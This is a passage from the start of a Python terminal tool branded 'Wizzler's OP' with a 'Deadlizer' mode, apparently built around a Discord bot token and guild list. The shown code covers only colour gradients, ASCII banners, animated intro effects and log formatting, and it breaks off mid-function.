import sys
import math
import asyncio
import httpx
import websockets
from itertools import cycle
from collections import deque
import random
import json
import os
import webbrowser
import base64
from datetime import datetime, timedelta
import time
try:
    import pyperclip as _pyperclip
except ImportError:
    _pyperclip = None

def _clipboard_copy(text):
    if _pyperclip is not None:
        try:
            _pyperclip.copy(text)
            return True
        except Exception:
            pass
    return False
import threading

VERSION = '2.1.4'

def hsv_to_rgb(h, s, v):
    h = float(h) % 360
    s = float(s)
    v = float(v)
    c = v * s
    x = c * (1 - abs((h / 60.0) % 2 - 1))
    m = v - c
    if h < 60: r, g, b = c, x, 0
    elif h < 120: r, g, b = x, c, 0
    elif h < 180: r, g, b = 0, c, x
    elif h < 240: r, g, b = 0, x, c
    elif h < 300: r, g, b = x, 0, c
    else: r, g, b = c, 0, x
    return (int((r + m) * 255), int((g + m) * 255), int((b + m) * 255))

class _AnimationSkipper:
    def __init__(self, required_presses=2):
        self.required = required_presses
        self.count = 0
        self.skipped = False
        self._thread = None
        self._stop = False

    def start(self):
        self._stop = False
        self.skipped = False
        self.count = 0
        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()

    def _listen(self):
        try:
            if os.name == 'nt':
                import msvcrt
                while not self._stop and not self.skipped:
                    if msvcrt.kbhit():
                        key = msvcrt.getwch()
                        if key in ('\r', '\n'):
                            self.count += 1
                            if self.count >= self.required:
                                self.skipped = True
                                return
                    else:
                        time.sleep(0.05)
            else:
                import select
                import sys as _sys
                while not self._stop and not self.skipped:
                    if select.select([_sys.stdin], [], [], 0.05)[0]:
                        _sys.stdin.readline()
                        self.count += 1
                        if self.count >= self.required:
                            self.skipped = True
                            return
        except Exception:
            pass

    def stop(self):
        self._stop = True

    @property
    def should_skip(self):
        return self.skipped

# GLOBALS
__mode__ = None
__manual_mode__ = False
__config__ = None
__loaded_configs__ = {}
__current_config_name__ = None
__config_index__ = 0
config_folder = "configs"
__bot_user_id__ = None
__bot_user_name__ = None
__bot_user_discriminator__ = None
__bot_guilds__ = []
__max_concurrent__ = 50
token = None
bot_instance = None


ALL_GRADIENTS = [
    ((0, 255, 255), (255, 0, 255)),
    ((128, 0, 128), (255, 215, 0)),
    ((0, 255, 0), (173, 255, 47)),
    ((255, 0, 0), (255, 165, 0)),
    ((0, 0, 255), (255, 255, 255)),
    ((255, 105, 180), (255, 255, 0)),
    ((255, 0, 0), (255, 255, 255)),
    ((180, 0, 255), (0, 255, 255)),
    ((255, 20, 147), (139, 0, 0)),
    ((255, 0, 255), (148, 0, 211)),
    ((255, 64, 64), (64, 64, 255)),
    ((0, 242, 255), (180, 40, 255)),
    ((255, 183, 77), (255, 82, 82)),
    ((100, 255, 218), (0, 188, 212)),
    ((255, 0, 100), (40, 0, 255)),
    ((255, 255, 0), (255, 0, 0)),
    ((224, 64, 251), (0, 229, 255)),
    ((118, 255, 3), (0, 229, 255)),
    ((255, 234, 0), (255, 0, 255)),
    ((0, 255, 127), (0, 128, 128)),
    ((255, 111, 0), (255, 255, 255)),
    ((64, 224, 208), (255, 127, 80)),
    ((255, 105, 180), (75, 0, 130)),
    ((0, 191, 255), (0, 0, 128)),
    ((255, 215, 0), (40, 40, 40)),
    ((173, 216, 230), (25, 25, 112)),
    ((255, 69, 0), (255, 215, 0)),
    ((124, 252, 0), (0, 100, 0)),
    ((147, 112, 219), (75, 0, 130)),
    ((240, 128, 128), (139, 0, 0)),
    ((0, 255, 255), (0, 128, 255)),
    ((255, 20, 147), (255, 160, 122)),
    ((0, 250, 154), (70, 130, 180)),
    ((255, 0, 0), (0, 0, 255)),
    ((255, 140, 0), (153, 50, 204)),
    ((172, 255, 47), (0, 191, 255)),
    ((255, 20, 147), (0, 255, 127)),
    ((135, 206, 235), (255, 182, 193)),
    ((255, 215, 0), (255, 69, 0)),
    ((0, 255, 255), (0, 0, 139)),
    ((255, 0, 255), (75, 0, 130)),
    ((0, 255, 127), (25, 25, 112)),
    ((255, 255, 240), (255, 140, 0)),
    ((255, 20, 147), (255, 255, 0)),
    ((0, 206, 209), (138, 43, 226)),
    ((255, 165, 0), (0, 0, 255)),
    ((0, 255, 0), (255, 20, 147)),
    ((255, 255, 255), (105, 105, 105)),
    ((255, 255, 0), (0, 0, 128)),
    ((30, 144, 255), (255, 20, 147)),
    ((255, 0, 0), (0, 255, 0)),
    ((135, 206, 250), (25, 25, 112)),
    ((218, 112, 214), (0, 0, 255)),
    ((255, 20, 147), (124, 252, 0)),
    ((0, 255, 255), (255, 215, 0)),
    ((255, 69, 0), (0, 255, 127)),
    ((255, 105, 180), (0, 191, 255)),
    ((255, 255, 0), (128, 0, 128)),
    ((255, 105, 180), (75, 0, 130)),
    ((255, 0, 0), (255, 255, 0)),
    ((0, 255, 0), (0, 0, 255)),
    ((255, 255, 255), (255, 105, 180)),
    ((255, 20, 147), (0, 206, 209)),
    ((124, 252, 0), (139, 0, 0)),
    ((0, 191, 255), (255, 69, 0)),
    ((255, 215, 0), (0, 0, 128)),
    ((186, 85, 211), (0, 255, 127)),
    ((255, 140, 0), (30, 144, 255)),
    ((0, 250, 154), (138, 43, 226)),
    ((255, 0, 255), (255, 255, 0)),
    ((0, 255, 255), (255, 0, 0)),
    ((255, 165, 0), (0, 0, 255)),
    ((0, 128, 0), (255, 192, 203)),
    ((128, 0, 128), (255, 255, 255)),
    ((0, 255, 0), (255, 20, 147)),
    ((0, 0, 255), (255, 255, 0)),
    ((255, 69, 0), (0, 255, 255)),
    ((139, 0, 139), (127, 255, 0)),
    ((255, 105, 180), (0, 0, 128)),
    ((0, 255, 127), (255, 215, 0)),
    ((75, 0, 130), (255, 255, 255)),
    ((30, 144, 255), (255, 20, 147)),
    ((124, 252, 0), (138, 43, 226)),
    ((0, 255, 255), (255, 165, 0)),
    ((255, 0, 255), (0, 128, 0)),
    ((139, 0, 0), (0, 255, 0)),
    ((0, 191, 255), (255, 0, 255)),
    ((255, 255, 0), (0, 0, 255)),
]

def pick_random_gradient():
    return random.choice(ALL_GRADIENTS)

W_START, W_END = pick_random_gradient()
WIZZLER_START = W_START
WIZZLER_END = W_END

D_START, D_END = pick_random_gradient()
DEADLIZER_START = D_START
DEADLIZER_END = D_END

SUCCESS_GRADIENTS = [
    ((0, 255, 150), (0, 60, 20)),
    ((50, 255, 80), (0, 40, 10)),
    ((20, 255, 20), (0, 15, 0)),
    ((127, 255, 0), (0, 100, 0)),
    ((0, 255, 127), (0, 128, 0)),
    ((173, 255, 47), (85, 107, 47)),
    ((0, 255, 64), (0, 32, 0)),
    ((64, 255, 208), (16, 64, 48)),
    ((200, 255, 0), (20, 40, 0)),
    ((0, 255, 255), (0, 64, 64)),
    ((152, 251, 152), (0, 100, 0)),
    ((0, 250, 154), (46, 139, 87)),
    ((144, 238, 144), (34, 139, 34)),
    ((50, 205, 50), (0, 100, 0)),
    ((0, 255, 0), (0, 40, 0)),
    ((127, 255, 0), (20, 60, 20)),
    ((0, 255, 127), (0, 30, 0)),
    ((152, 251, 152), (0, 50, 0)),
    ((0, 250, 154), (0, 20, 10)),
    ((144, 238, 144), (20, 40, 20)),
    ((0, 255, 64), (0, 10, 5)),
    ((64, 255, 208), (0, 32, 16)),
    ((200, 255, 0), (10, 20, 0)),
]
S_START, S_END = random.choice(SUCCESS_GRADIENTS)
GREEN_START = S_START
GREEN_END = S_END

ERROR_GRADIENTS = [
    ((255, 0, 0), (20, 0, 0)),
    ((255, 69, 0), (45, 0, 0)),
    ((255, 20, 147), (40, 0, 10)),
    ((139, 0, 0), (20, 0, 0)),
    ((255, 0, 255), (40, 0, 40)),
    ((255, 48, 48), (64, 0, 0)),
    ((255, 127, 80), (80, 20, 0)),
    ((255, 0, 127), (32, 0, 16)),
    ((255, 64, 0), (32, 8, 0)),
    ((220, 20, 60), (40, 0, 0)),
    ((255, 99, 71), (139, 0, 0)),
    ((250, 128, 114), (128, 0, 0)),
    ((255, 0, 0), (75, 0, 130)),
    ((255, 0, 0), (30, 0, 0)),
    ((220, 20, 60), (40, 0, 0)),
    ((178, 34, 34), (10, 0, 0)),
    ((255, 69, 0), (20, 5, 0)),
    ((255, 20, 147), (40, 0, 20)),
    ((255, 127, 80), (30, 10, 0)),
    ((255, 0, 127), (40, 0, 40)),
    ((128, 0, 0), (60, 0, 0)),
]
E_START, E_END = random.choice(ERROR_GRADIENTS)
RED_START = E_START
RED_END = E_END

PINK_GRADIENTS = [
    ((255, 105, 180), (40, 0, 130)),
    ((255, 20, 147), (75, 0, 130)),
    ((218, 112, 214), (139, 0, 139)),
    ((255, 182, 193), (199, 21, 133)),
    ((255, 0, 255), (25, 25, 112)),
    ((255, 105, 180), (20, 0, 40)),
    ((218, 112, 214), (40, 0, 40)),
    ((255, 192, 203), (128, 0, 128)),
    ((255, 182, 193), (75, 0, 130)),
]
P_START, P_END = random.choice(PINK_GRADIENTS)
PINK_START = P_START
PINK_END = P_END

WIZZLER_ASCII = [
    "██╗    ██╗██╗███████╗███████╗██╗     ███████╗██████╗ ███████╗     ██████╗ ██████╗ ",
    "██║    ██║██║╚══███╔╝╚══███╔╝██║     ██╔════╝██╔══██╗██╔════╝    ██╔═══██╗██╔══██╗",
    "██║ █╗ ██║██║  ███╔╝   ███╔╝ ██║     █████╗  ██████╔╝███████╗    ██║   ██║██████╔╝",
    "██║███╗██║██║ ███╔╝   ███╔╝  ██║     ██╔══╝  ██╔══██╗╚════██║    ██║   ██║██╔═══╝ ",
    "╚███╔███╔╝██║███████╗███████╗███████╗███████╗██║  ██║███████║    ╚██████╔╝██║     ",
    " ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝     ",
]

DEADLIZER_ASCII = [
    "  ██████╗ ███████╗ █████╗ ██████╗ ██╗     ██╗███████╗███████╗██████╗ ",
    "  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║     ██║╚══███╔╝██╔════╝██╔══██╗",
    "  ██║  ██║█████╗  ███████║██║  ██║██║     ██║  ███╔╝ █████╗  ██████╔╝",
    "  ██║  ██║██╔══╝  ██╔══██║██║  ██║██║     ██║ ███╔╝  ██╔══╝  ██╔══██╗",
    "  ██████╔╝███████╗██║  ██║██████╔╝███████╗██║███████╗███████╗██║  ██║",
    "  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝",
]

WIZZLER_ASCII_STYLES = [WIZZLER_ASCII]
DEADLIZER_ASCII_STYLES = [DEADLIZER_ASCII]

STARTUP_BANNER = [
    "                             __xxxxxxxxxxxxxxxx___.                    ",
    "                        _gxXXXXXXXXXXXXXXXXXXXXXXXX!x_                ",
    "                   __x!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!x_           ",
    "                ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx_         ",
    "              ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!_       ",
    "            _!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.     ",
    "          gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXs    ",
    "        ,!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.  ",
    "       g!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!   ",
    "      iXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!  ",
    "     ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx ",
    "     !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx",
    "   ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx",
    "   !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXi",
    "  dXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
    "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
    "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
]

def show_startup_banner():
    import sys, math
    os.system("cls") if os.name == "nt" else os.system("clear")
    try:
        cols = os.get_terminal_size().columns
        rows = os.get_terminal_size().lines
    except Exception:
        cols = 80
        rows = 24
    if rows < 20 or cols < 60:
        for line in STARTUP_BANNER[:min(len(STARTUP_BANNER), rows-4)]:
            print(line[:cols-1])
        time.sleep(0.5)
        os.system("cls") if os.name == "nt" else os.system("clear")
        return
    sys.stdout.write("\033[?25l")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    banner_block = STARTUP_BANNER
    total_lines = min(len(banner_block), rows - 4)
    banner_block = banner_block[:total_lines]
    max_width = min(max(len(line) for line in banner_block), cols - 4)
    frames = 8
    for frame in range(frames):
        if skipper.should_skip:
            break
        sys.stdout.write("\033[H")
        t = frame / max(frames - 1, 1)
        for row_idx, line in enumerate(banner_block):
            if row_idx >= rows - 2:
                break
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, char in enumerate(line[:max_width]):
                if char == ' ':
                    output += " "
                    continue
                hue = (col_idx * 2 + row_idx * 3 + frame * 8) % 360
                r, g, b = hsv_to_rgb(hue, 0.8, 0.6 + 0.4 * t)
                output += f"\033[38;2;{r};{g};{b}m{char}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.05)
    if not skipper.should_skip:
        time.sleep(0.2)
    skipper.stop()
    sys.stdout.write("\033[?25h")
    os.system("cls") if os.name == "nt" else os.system("clear")

def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b
    visible_length = 0
    i = 0
    while i < len(text):
        if text[i] == '\033':
            end = text.find('m', i)
            i = end + 1 if end != -1 else i + 1
        else:
            visible_length += 1
            i += 1
    if visible_length == 0:
        return text
    result = ""
    current_idx = 0
    i = 0
    while i < len(text):
        if text[i] == '\033':
            end = text.find('m', i)
            if end != -1:
                result += text[i:end+1]
                i = end + 1
            else:
                result += text[i]
                i += 1
        else:
            ratio = current_idx / max(visible_length - 1, 1)
            r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
            color_code = rgb_to_256(r, g, b)
            if bold:
                result += f"\033[1m\033[38;5;{color_code}m{text[i]}"
            else:
                result += f"\033[38;5;{color_code}m{text[i]}"
            current_idx += 1
            i += 1
    result += "\033[0m"
    return result

def get_mode_colors():
    if __mode__ == "deadlizer":
        return DEADLIZER_START, DEADLIZER_END
    else:
        return WIZZLER_START, WIZZLER_END

def format_log_message(status, message, padding=50):
    grey = "\033[90m"
    reset = "\033[0m"
    timestamp = f"{grey}[{datetime.now():%Y-%m-%d %H:%M:%S}]{reset}"
    user_tag = f"{grey}~ Codez On Top {reset}"
    mode_start, mode_end = get_mode_colors()
    visible_len = 0
    _t_idx = 0
    while _t_idx < len(message):
        if message[_t_idx] == '\033':
            _end = message.find('m', _t_idx)
            _t_idx = _end + 1 if _end != -1 else _t_idx + 1
        else:
            visible_len += 1
            _t_idx += 1
    padded_msg = message + " " * max(0, padding - visible_len)
    if status == "SUCCESS":
        status_text = gradient_text("(+) SUCCESS", GREEN_START, GREEN_END, bold=True)
        msg_text = gradient_text(padded_msg, GREEN_START, GREEN_END, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"
    elif status == "ERROR":
        status_text = gradient_text("(-) ERROR", RED_START, RED_END, bold=True)
        msg_text = gradient_text(padded_msg, RED_START, RED_END, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"
    elif status == "INPUT":
        grey = "\033[90m"
        reset = "\033[0m"
        bracket_open = gradient_text("(", WIZZLER_START, WIZZLER_END, bold=True)
        bracket_close = gradient_text(")", WIZZLER_START, WIZZLER_END, bold=True)
        status_text = bracket_open + grey + "INP" + reset + bracket_close + " " + gradient_text("INPUT", mode_start, mode_end, bold=True)
        msg_text = gradient_text(padded_msg, mode_start, mode_end, bold=True)
        arrow = gradient_text(">", mode_start, mode_end, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}  {arrow}  "
    else:
        status_text = gradient_text("(~) INFO", mode_start, mode_end, bold=True)
        msg_text = gradient_text(padded_msg, mode_start, mode_end, bold=True)
        return f"{timestamp} {status_text} {user_tag}  {msg_text}"

def _carnage_effect():
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
        cols = min(cols, 100)
        rows = min(rows, 30)
    except Exception:
        cols, rows = 80, 24
    def blood_color(i, flicker=0.0):
        i = max(0.0, min(1.0, i))
        f = 1.0 + flicker * random.uniform(-0.2, 0.2)
        return (min(255, int((200 * i + 30) * f)), min(255, int(5 * i * f)), min(255, int(10 * i * f)))
    frames = 20
    tentacles = []
    num_tentacles = min(20, cols // 4)
    for i in range(num_tentacles):
        side = i % 4
        if side == 0:   tx, ty = random.randint(0, cols-1), 0
        elif side == 1: tx, ty = random.randint(0, cols-1), rows-1
        elif side == 2: tx, ty = 0, random.randint(0, rows-1)
        else:           tx, ty = cols-1, random.randint(0, rows-1)
        angle = math.atan2(rows//2 - ty, cols//2 - tx) + random.uniform(-0.5, 0.5)
        tentacles.append({
            'x': float(tx), 'y': float(ty),
            'angle': angle,
            'speed': random.uniform(1.0, 2.5),
            'wave_amp': random.uniform(0.5, 1.5),
            'wave_freq': random.uniform(0.1, 0.3),
            'wave_phase': random.uniform(0, math.pi * 2),
            'history': [(tx, ty)],
            'max_hist': random.randint(10, 25),
            'thickness': 2,
            'char': random.choice("╠╣╦╩╬╔╗╚╝║═▓█▒░@#&%$~≈≋"),
            'age': 0,
            'spawn_delay': i * 1.0,
            'pulse_offset': random.uniform(0, math.pi * 2),
        })
    TENTACLE_CHARS = "╠╣╦╩╬╔╗╚╝║═▓█▒░@#&%$~≈≋"
    VEIN_CHARS = "│┤╡╢╖╕╣║╗╝╜╛┐└┴┬├─┼╞╟╚╔╩╦╠═╬╧╨╤╥╙╘╒╓╫╪┘┌"
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]
        for tent in tentacles:
            if frame < tent['spawn_delay']: continue
            tent['age'] += 1
            perp_angle = tent['angle'] + math.pi / 2
            wave_offset = tent['wave_amp'] * math.sin(tent['age'] * tent['wave_freq'] + tent['wave_phase'])
            dx = cols // 2 - tent['x']
            dy = rows // 2 - tent['y']
            steer_angle = math.atan2(dy, dx)
            angle_diff = steer_angle - tent['angle']
            while angle_diff > math.pi: angle_diff -= 2*math.pi
            while angle_diff < -math.pi: angle_diff += 2*math.pi
            tent['angle'] += angle_diff * 0.05 + random.uniform(-0.1, 0.1)
            tent['x'] = (tent['x'] + math.cos(tent['angle']) * tent['speed'] + math.cos(perp_angle) * wave_offset) % cols
            tent['y'] = (tent['y'] + math.sin(tent['angle']) * tent['speed'] + math.sin(perp_angle) * wave_offset * 0.5) % rows
            px, py = int(tent['x']), int(tent['y'])
            if 0 <= px < cols and 0 <= py < rows:
                tent['history'].append((px, py))
            if len(tent['history']) > tent['max_hist']:
                tent['history'].pop(0)
            hist_len = len(tent['history'])
            for h_idx, (hx, hy) in enumerate(tent['history']):
                if not (0 <= hx < cols and 0 <= hy < rows): continue
                seg_t = h_idx / max(hist_len - 1, 1)
                body_pulse = 0.7 + 0.3 * math.sin(frame * 0.3 + tent['pulse_offset'] + seg_t * math.pi)
                r, g, b = blood_color(seg_t * body_pulse, flicker=0.1)
                ch = random.choice(TENTACLE_CHARS) if h_idx == hist_len - 1 else random.choice(VEIN_CHARS)
                grid[hy][hx] = ch
                cgrid[hy][hx] = (r, g, b)
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                r, g, b = cgrid[r_idx][c_idx]
                line_out += f"\033[38;2;{r};{g};{b}m{ch}" if ch != " " else " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _cyberpunk_effect():
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
        cols = min(cols, 100)
        rows = min(rows, 30)
    except Exception:
        cols, rows = 80, 24
    def neon_color(t, hue_shift=0.0):
        h = (t * 360 + hue_shift) % 360
        s, v = 0.8, 1.0
        c = v * s
        x = c * (1 - abs((h / 60) % 2 - 1))
        m = v - c
        if h < 60:   r2, g2, b2 = c, x, 0
        elif h < 120: r2, g2, b2 = x, c, 0
        elif h < 180: r2, g2, b2 = 0, c, x
        elif h < 240: r2, g2, b2 = 0, x, c
        elif h < 300: r2, g2, b2 = x, 0, c
        else:         r2, g2, b2 = c, 0, x
        return int((r2+m)*255), int((g2+m)*255), int((b2+m)*255)
    w_banner = [line.center(cols) for line in WIZZLER_ASCII]
    banner_start = rows // 2 - len(w_banner) // 2
    frames = 20
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / max(frames - 1, 1)
        shock_radius = t * max(cols, rows) * 0.6
        ring_width = 3 + frame * 0.2
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                dist = math.sqrt((c_idx - cols/2)**2 + ((r_idx - rows/2) * 2)**2)
                in_ring = abs(dist - shock_radius) < ring_width
                inside = dist < shock_radius
                line_idx = r_idx - banner_start
                is_banner = (0 <= line_idx < len(w_banner) and c_idx < len(w_banner[line_idx]) and w_banner[line_idx][c_idx] != " ")
                if in_ring:
                    ring_t = 1.0 - abs(dist - shock_radius) / ring_width
                    r2, g2, b2 = neon_color(frame * 0.04, hue_shift=c_idx * 1.5 + 200)
                    r2 = min(255, int(r2 * ring_t + 150 * ring_t))
                    g2 = min(255, int(g2 * ring_t + 150 * ring_t))
                    b2 = min(255, int(b2 * ring_t + 150 * ring_t))
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice('█▓▒░')}"
                elif inside and is_banner:
                    h_blend = c_idx / max(cols-1, 1)
                    r2 = int(WIZZLER_START[0]*(1-h_blend) + WIZZLER_END[0]*h_blend)
                    g2 = int(WIZZLER_START[1]*(1-h_blend) + WIZZLER_END[1]*h_blend)
                    b2 = int(WIZZLER_START[2]*(1-h_blend) + WIZZLER_END[2]*h_blend)
                    pulse = 0.8 + 0.2 * math.sin(frame * 0.3 + c_idx * 0.05)
                    line_out += f"\033[1m\033[38;2;{min(255,int(r2*pulse))};{min(255,int(g2*pulse))};{min(255,int(b2*pulse))}m{w_banner[line_idx][c_idx]}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _menu_fade_out(color_start, color_end):
    import sys
    try:
        cols = os.get_terminal_size().columns
        rows = os.get_terminal_size().lines
        cols = min(cols, 100)
        rows = min(rows, 30)
    except Exception:
        cols = 80
        rows = 24
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    steps = 4
    for step in range(steps):
        if skipper.should_skip:
            break
        t = step / max(steps - 1, 1)
        fade = 1.0 - t
        sys.stdout.write("\033[H")
        for row in range(rows):
            line = ""
            for c in range(cols):
                if random.random() < fade * 0.3:
                    h_blend = c / max(cols - 1, 1)
                    r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                    g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                    b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                    r = min(255, int(r * fade))
                    g = min(255, int(g * fade))
                    b = min(255, int(b * fade))
                    line += f"\033[38;2;{r};{g};{b}m{random.choice('|||| ')}"
                else:
                    line += " "
            sys.stdout.write(line + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.04)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _animate_typewriter_log(status, message, padding=50):
    import sys, time, random
    full_msg = format_log_message(status, message, padding)
    segments = []
    current_esc = ""
    i = 0
    while i < len(full_msg):
        if full_msg[i] == '\033':
            end = full_msg.find('m', i)
            if end != -1:
                current_esc += full_msg[i:end + 1]
                i = end + 1
            else:
                current_esc += full_msg[i]
                i += 1
        else:
            segments.append((current_esc, full_msg[i]))
            current_esc = ""
            i += 1
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    for k in range(1, len(segments) + 1):
        if skipper.should_skip:
            break
        sys.stdout.write("\r")
        out = "".join(e + c for e, c in segments[:k])
        cursor = "█" if k % 2 == 0 else " "
        sys.stdout.write(out + f"\033[38;2;255;255;255m{cursor}\033[0m")
        sys.stdout.flush()
        time.sleep(random.uniform(0.008, 0.02))
    skipper.stop()
    sys.stdout.write("\r" + full_msg + "   \n")
    sys.stdout.flush()

def _animate_guild_list(guilds, color_start, color_end):
    import sys, time, random, math
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    os.system("cls") if os.name == "nt" else os.system("clear")
    try:
        term_cols, term_rows = os.get_terminal_size()
        term_cols = min(term_cols, 100)
    except Exception:
        term_cols, term_rows = 80, 24
    header_text = "Available Guilds:"
    padding_val = min(70, term_cols - 10)
    box_top = "╭" + "─" * padding_val + "╮"
    box_bot = "╰" + "─" * padding_val + "╯"
    guild_lines = []
    for i, guild in enumerate(guilds):
        name = str(guild.get('name', 'Unknown'))[:30]
        gid = str(guild.get('id', 'N/A'))
        line = f"│ {i+1:>3} │ {name:<30} │ ID: {gid:<20}  │"
        guild_lines.append(line)
    all_lines = [box_top] + guild_lines + [box_bot]
    n = len(all_lines)
    def render_line(line, row_idx, step, visible_chars=None, sparkle=True):
        pad = max((term_cols - len(line)) // 2, 0)
        output = ""
        v_ratio = row_idx / max(n - 1, 1)
        for col_idx, ch in enumerate(line):
            h_ratio = col_idx / max(len(line)-1, 1)
            mix = (h_ratio * 0.4 + v_ratio * 0.6)
            r = int(color_start[0] * (1 - mix) + color_end[0] * mix)
            g = int(color_start[1] * (1 - mix) + color_end[1] * mix)
            b = int(color_start[2] * (1 - mix) + color_end[2] * mix)
            if visible_chars is not None and col_idx < visible_chars:
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            else:
                output += " "
        return " " * pad + "\033[1m" + output + "\033[0m"
    print(format_log_message("INFO", header_text, 50))
    total_frames = 12
    for frame in range(total_frames):
        if skipper.should_skip:
            break
        if frame > 0:
            sys.stdout.write(f"\033[{n}A")
        t = frame / (total_frames - 1)
        for row_idx, line in enumerate(all_lines):
            row_delay = row_idx * 0.3
            row_t = max(0.0, min(1.0, (t * (8 + row_delay)) / 8))
            visible = int(row_t * len(line))
            sys.stdout.write(render_line(line, row_idx, frame, visible_chars=visible) + "\n")
        sys.stdout.flush()
        time.sleep(0.025)
    if not skipper.should_skip:
        sys.stdout.write(f"\033[{n}A")
    else:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("INFO", header_text, 50))
    for row_idx, line in enumerate(all_lines):
        pad = max((term_cols - len(line)) // 2, 0)
        v_ratio = row_idx / max(n - 1, 1)
        out = ""
        for col_idx, ch in enumerate(line):
            h_ratio = col_idx / max(len(line)-1, 1)
            mix = (h_ratio * 0.4 + v_ratio * 0.6)
            r = int(color_start[0] * (1 - mix) + color_end[0] * mix)
            g = int(color_start[1] * (1 - mix) + color_end[1] * mix)
            b = int(color_start[2] * (1 - mix) + color_end[2] * mix)
            out += f"\033[38;2;{r};{g};{b}m{ch}"
        sys.stdout.write(" " * pad + "\033[1m" + out + "\033[0m\n")
    sys.stdout.flush()
    skipper.stop()

def _menu_load_animation(banner_lines, color_start, color_end, mode_label):
    import sys, math
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols = os.get_terminal_size().columns
        term_rows = os.get_terminal_size().lines
        cols = min(cols, 100)
    except Exception:
        cols = 80
        term_rows = 24
    total_lines = len(banner_lines)
    max_width = min(max(len(line) for line in banner_lines) if banner_lines else 40, cols - 4)
    phase1_frames = 12
    lock_frame = []
    for row_idx, line in enumerate(banner_lines):
        row_locks = []
        for col_idx in range(len(line)):
            cx, cy = max_width / 2, total_lines / 2
            dist = math.sqrt((col_idx - cx) ** 2 + ((row_idx - cy) * 3) ** 2)
            max_dist = math.sqrt(cx ** 2 + (cy * 3) ** 2)
            progress = dist / max(max_dist, 1)
            lock_at = int(3 + progress * (phase1_frames - 8)) + random.randint(-2, 2)
